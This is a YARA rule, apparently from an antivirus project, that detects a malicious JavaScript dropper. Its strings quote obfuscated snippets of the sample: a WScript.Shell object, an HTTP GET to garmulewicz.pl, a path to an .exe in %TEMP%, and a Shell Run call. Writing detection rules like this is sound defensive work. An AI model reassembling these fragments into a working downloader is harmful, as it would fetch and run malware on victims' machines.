rule sig_20160401_02f9cfd2d5187975f4cde2b88c80004e {
  meta:
    description = "datamaliciousorder - file 20160401_02f9cfd2d5187975f4cde2b88c80004e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5d7694dcbe97b7127a48834c38e8a18be71cd08002ffd1b004a161875966294d"

  strings:
    $s1  = "function SbyVj(VjSw, ZdqYe){OaVw = OaVw * 1; return VjSw - ZdqYe;};" fullword ascii
    $s2  = "var HkMj = function PvCkk() {return WScript[NyfShq](\"WScript\"+\".Shell\");}(), XeJg = 11;" fullword ascii
    $s3  = "DyjKol[TlaMg](\"G\" + \"ET\", \"http://garmulewicz.pl/v4yhsa\", false);" fullword ascii
    $s4  = "if (DyjKol[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function PrJw() {return HkMj[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7espDPpbxGc3.ex\" + \"e\";};" fullword ascii
    $s6  = "function QdSc(){return MlPbz + \"\";};" fullword ascii
    $s7  = "function GnXn() {return ((LbvFf == true) && (LbvFf == PypZh)) ? 1 : OaVw;};" fullword ascii
    $s8  = "function RxYcf(){return NyfShq;};" fullword ascii
    $s9  = "function CwkDqu(){return 23;};" fullword ascii
    $s10 = "var FshUxf = false;" fullword ascii
    $s11 = "var SaQnc = new this[\"Date\"]();" fullword ascii
    $s12 = "var LbvFf = false;" fullword ascii
    $s13 = "}while (WtgQkd);" fullword ascii
    $s14 = "function QkgIx(IlbOfj) {var VkuQvx = (1, 2, 3, 4, 5, IlbOfj); return VkuQvx;};" fullword ascii
    $s15 = "PypZh = true; " fullword ascii
    $s16 = "function CzQo()" fullword ascii
    $s17 = "function WwNeg(BvmCuh){HkMj[\"R\"+\"un\"](BvmCuh, OaVw, OaVw);};" fullword ascii
    $s18 = "LbvFf = true; " fullword ascii
    $s19 = "return SbyVj(ZaiIuh, ChQv);" fullword ascii
    $s20 = "var PypZh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}